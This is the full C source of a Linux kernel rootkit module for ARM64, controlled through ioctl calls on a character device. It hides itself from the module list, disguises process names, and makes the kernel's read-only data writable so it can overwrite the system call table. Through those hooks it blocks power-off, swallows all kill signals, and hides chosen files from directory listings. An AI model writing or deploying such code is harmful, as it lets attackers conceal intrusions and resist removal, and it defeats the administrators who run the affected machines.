#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/kprobes.h>
#include <linux/reboot.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

static int hidden = 0, reboot_hooked = 0, kill_hooked = 0, getdents64_hooked = 0;
static struct list_head *prev_module;
static struct masq_proc_req *req_list;
static struct hided_file *hided_files;
static unsigned long *sys_call_table_ptr;
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
// update_mapping_prot: from /arch/arm64/mm/mmu.c
static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
				phys_addr_t size, pgprot_t prot) = NULL;


static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

// Hide/Unhide this module by removing/adding it from/to the kernel's module list
static int hide_show_rootkit(void)
{
	struct list_head;
	if(hidden) {
		// show the module
		list_add(&THIS_MODULE->list, prev_module);
		hidden = 0;
		return 0;
	}
	else {
		// hide the module
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		hidden = 1;
		return 0;
	}
	return -ENOENT; // Module not found
}

// Masquerade the name of a process as another process
static int masq_proc_rootkit(struct masq_proc_req *req_list)
{
	struct task_struct *task = current;
	struct masq_proc *proc;
	int new_name_len, orig_name_len, i;

	// Check if the list is empty
	if(req_list->len == 0) {
		printk(KERN_INFO "Empty list for masquerade!\n");
		return 0;
	}
	// Iterate over the req_list
	for(i = 0; i < req_list->len; i++) {
		proc = &(req_list->list[i]);
		// Check if the original name is longer than the new name
		if((orig_name_len = strlen(proc->orig_name)) <= (new_name_len = strlen(proc->new_name))) {
			printk(KERN_INFO "Process '%s': New name is not shorter than the original name! Not masqueraded!\n", proc->orig_name);
			continue;
		}
		// Iterate over the task list
		for_each_process(task) {
			if(strcmp(task->comm, proc->orig_name) == 0) {
				// Masquerade the name of the process
				strncpy(task->comm, proc->new_name, new_name_len);
				task->comm[new_name_len] = '\0';
				printk(KERN_INFO "Process '%s' masqueraded as '%s'\n", proc->orig_name, proc->new_name);
			}
		}
	}
	return 0;
}

// function pointer for original reboot syscall: /include/linux/syscalls.h
static asmlinkage long (*orig_reboot)(int magic1, int magic2, unsigned int cmd,
				void __user *arg);

// my hooked reboot syscall
static asmlinkage long my_sys_reboot(int magic1, int magic2, unsigned int cmd,
				void __user *arg)
{
	if(cmd == LINUX_REBOOT_CMD_POWER_OFF) {
		printk(KERN_INFO "Power Off denied!!!\n");
		return 0;
	}
	printk(KERN_INFO "Not power off!!!\n");
	return orig_reboot(magic1, magic2, cmd, arg);
}

// function pointer for original kill syscall: /include/linux/syscalls.h
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

// my hooked kill syscall
static asmlinkage long my_sys_kill(pid_t pid, int sig)
{
	if(sig == SIGKILL){
		printk(KERN_INFO "No Process Killing!!!\n");
		//return 0;
	}
	return 0;
}

// function pointer for original kill syscall: /include/linux/syscalls.h
static asmlinkage long (*orig_getdents64)(unsigned int fd,
				struct linux_dirent64 __user *dirent,
				unsigned int count);

// my hooked getdents64 syscall
static asmlinkage long my_sys_getdents64(unsigned int fd,
				struct linux_dirent64 __user *dirent,
				unsigned int count)
{
	// get the original return value (number of bytes) of the syscall
	int ret;
	long error;
	struct linux_dirent64 *cur_dirent = NULL, *prev_dirent = NULL, *kernel_dirent = NULL;

	ret = orig_getdents64(fd, dirent, count);
	//printk(KERN_INFO "orig_getdents64: %s\n", dirent->d_name);
	//return ret;
	
	if(ret < 0) {
		printk(KERN_INFO "getdents64 failed\n");
		return ret;
	}
	else if(ret == 0) {
		printk(KERN_INFO "No file found\n");
		return ret;
	}
	printk(KERN_INFO "%d returned from orig_getdent64\n", ret);

	// allocate memory for the list
	kernel_dirent = (struct linux_dirent64 *)kmalloc(ret, GFP_KERNEL);
	if(kernel_dirent == NULL) {
		printk(KERN_INFO "kzalloc failed\n");
		return ret;
	}
	error = copy_from_user(kernel_dirent, dirent, ret);
	if(error) {
		printk(KERN_INFO "FILE HIDE: copy_from_user failed\n");
		return ret;
	}
	//return ret;

	// Iterate through the dir list to check and hide the file/directory
	cur_dirent = kernel_dirent;
	prev_dirent = cur_dirent;
	while((void *)cur_dirent < (void *)kernel_dirent + ret) {
		if(strncmp(cur_dirent->d_name, hided_files->name, strlen(hided_files->name)) == 0) {
			// remove the entry from the list
			if(cur_dirent == kernel_dirent) {
				// if the entry is the first entry
				ret -= cur_dirent->d_reclen;
				memmove(cur_dirent, (void *)cur_dirent + cur_dirent->d_reclen, ret);
				continue;
			}
			else {
				// if the entry is not the first entry
				prev_dirent->d_reclen += cur_dirent->d_reclen;
			}
		}
		else {
			// move to the next entry
			prev_dirent = cur_dirent;
		}
		cur_dirent = (void *)cur_dirent + cur_dirent->d_reclen;
	}
	error = copy_to_user(dirent, kernel_dirent, ret);
	if(error) {
		printk(KERN_INFO "copy_to_user failed\n");
		return ret;
	}
	return ret;

}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	printk(KERN_INFO "%s\n", __func__);
	switch(ioctl) {
	case IOCTL_MOD_HIDE:
		// Hide the module
		if(hide_show_rootkit()) {
			printk(KERN_INFO "Module not found\n");
			return -EFAULT;
		}
		break;
	case IOCTL_MOD_MASQ:
	{
		int i;
		struct masq_proc *list_ptr;
		req_list = (struct masq_proc_req *)kzalloc(sizeof(struct masq_proc_req), GFP_KERNEL);
		// read in masq_proc_req struct from user space
		if(copy_from_user((void *)req_list, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req))) {
			printk(KERN_INFO "copy_from_user failed\n");
			return -EFAULT;
		}
		//printk(KERN_INFO "Hello! arg_ptr is %lu\n", (unsigned long)req_list);
		list_ptr = req_list->list;
		// req_list->len = arg_ptr->len;

		// allocate memory for the list of masq_proc list
		req_list->list = (struct masq_proc *)kzalloc(req_list->len * sizeof(struct masq_proc), GFP_KERNEL);
		// read in the list of masq_proc from user space one by one
		//printk(KERN_INFO "Before copy_from_user! len is %ld\n", req_list->len);
		for(i = 0; i < req_list->len; i++) {
			if(copy_from_user(&(req_list->list[i]), (struct masq_proc *)(&(list_ptr[i])), sizeof(struct masq_proc))) {
				printk(KERN_INFO "copy_from_user failed\n");
				return -EFAULT;
			}
		}

		// Masquerade the process
		if(masq_proc_rootkit(req_list)) {
			printk(KERN_INFO "masq_proc_rootkit failed\n");
			return -EFAULT;
		}
		break;
	}
	case IOCTL_MOD_HOOK:
	{
		unsigned long start_rodata, init_begin;
		kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
		// use kprobe to search for the function **kallsyms_lookup_name**
		// struct kprobe kp;
		int kp_err;
		if ((kp_err = register_kprobe(&kp)) < 0) {
			printk(KERN_INFO "Failed to register kprobe: err_no is %d\n", kp_err);
			return -EFAULT;
		}
		// get the address of the function **kallsyms_lookup_name**
		kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
		unregister_kprobe(&kp);

		// sys_call_table_ptr = get_sys_call_table(kallsyms_lookup_name_ptr);
		// get the address of the sys_call_table
		sys_call_table_ptr = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
		if(sys_call_table_ptr == NULL){
			printk(KERN_INFO "Cannot get sys_call_table");
			return -EFAULT;
		}
		printk(KERN_INFO "Successfully get sys_call_table!");
		
		// change the read-only permission of sys_call_table to read-write using update_mapping_prot
		// update the write permission of the memory segment containing sys_call_table,
		// which is from __start_rodata to __init_begin
		start_rodata = (unsigned long)kallsyms_lookup_name_ptr("__start_rodata");
		init_begin = (unsigned long)kallsyms_lookup_name_ptr("__init_begin");
		update_mapping_prot = (void *)kallsyms_lookup_name_ptr("update_mapping_prot");
		printk(KERN_INFO "Successfully get update_mapping_prot!");
		
		update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL);
		printk(KERN_INFO "Successfully update permission!");

		// Hook the syscalls
		// hook_syscalls();
		if(!reboot_hooked){
			// Hook the syscall: reboot
			orig_reboot = (void *)sys_call_table_ptr[__NR_reboot];
			sys_call_table_ptr[__NR_reboot] = (unsigned long)my_sys_reboot;
			reboot_hooked = 1;
		}
		if(!kill_hooked){
			// Hook the syscall: kill
			orig_kill = (void *)sys_call_table_ptr[__NR_kill];
			sys_call_table_ptr[__NR_kill] = (unsigned long)my_sys_kill;
			kill_hooked = 1;
		}

		// change the read-write permission of sys_call_table back to read-only using update_mapping_prot
		update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);
		printk(KERN_INFO "Successfully update permission!");
		break;
	}
	case IOCTL_FILE_HIDE:
	{
		unsigned long start_rodata, init_begin;
		kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
		int kp_err;
		hided_files = (struct hided_file *)kzalloc(sizeof(struct hided_file), GFP_KERNEL);
		// Read in the len in hided_file struct from user space
		if(copy_from_user((void *)hided_files, (struct hided_file *)arg, sizeof(struct hided_file))) {
			printk(KERN_INFO "READ FILENAME: copy_from_user failed\n");
			return -EFAULT;
		}

		// use kprobe to search for the function **kallsyms_lookup_name**
		// struct kprobe kp;
		if ((kp_err = register_kprobe(&kp)) < 0) {
			printk(KERN_INFO "Failed to register kprobe: err_no is %d\n", kp_err);
			return -EFAULT;
		}
		// get the address of the function **kallsyms_lookup_name**
		kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
		unregister_kprobe(&kp);

		// get the sys_call_table
		// sys_call_table_ptr = get_sys_call_table(kallsyms_lookup_name_ptr);
		sys_call_table_ptr = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
		if(sys_call_table_ptr == NULL){
			printk(KERN_INFO "Cannot get sys_call_table");
			return -EFAULT;
		}

		// change permission of sys_call_table
		start_rodata = (unsigned long)kallsyms_lookup_name_ptr("__start_rodata");
		init_begin = (unsigned long)kallsyms_lookup_name_ptr("__init_begin");
		update_mapping_prot = (void *)kallsyms_lookup_name_ptr("update_mapping_prot");
		update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL);

		// Hook the syscall: getdents64
		if(!getdents64_hooked){
			orig_getdents64 = (void *)sys_call_table_ptr[__NR_getdents64];
			sys_call_table_ptr[__NR_getdents64] = (unsigned long)my_sys_getdents64;
			getdents64_hooked = 1;
		}
		// change permission of sys_call_table back to read-only
		update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);
		break;
	}
	default:
		printk(KERN_INFO "Invalid ioctl\n");
		return -EINVAL;
	}
	return 0;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	unsigned long start_rodata, init_begin;
	kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
	int kp_err;
	printk(KERN_INFO "In __exit!");

	// use kprobe to search for the function **kallsyms_lookup_name**
	// struct kprobe kp;
	if ((kp_err = register_kprobe(&kp)) < 0) {
		printk(KERN_INFO "Failed to register kprobe: err_no is %d\n", kp_err);
		return;
	}
	// get the address of the function **kallsyms_lookup_name**
	kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);

	// sys_call_table_ptr = get_sys_call_table(kallsyms_lookup_name_ptr);
	sys_call_table_ptr = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
	if(sys_call_table_ptr == NULL){
		printk(KERN_INFO "Cannot get sys_call_table");
		return;
	}
	start_rodata = (unsigned long)kallsyms_lookup_name_ptr("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name_ptr("__init_begin");
	update_mapping_prot = (void *)kallsyms_lookup_name_ptr("update_mapping_prot");
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL);

	// unhook_syscalls();
	if(reboot_hooked) {
		// Unhook the syscall: reboot
		sys_call_table_ptr[__NR_reboot] = (unsigned long)orig_reboot;
		reboot_hooked = 0;
	}
	if(kill_hooked){
		// Unhook the syscall: kill
		sys_call_table_ptr[__NR_kill] = (unsigned long)orig_kill;
		kill_hooked = 0;
	}
	if(getdents64_hooked){
		sys_call_table_ptr[__NR_getdents64] = (unsigned long)orig_getdents64;
		getdents64_hooked = 0;
	}
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);
	
	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
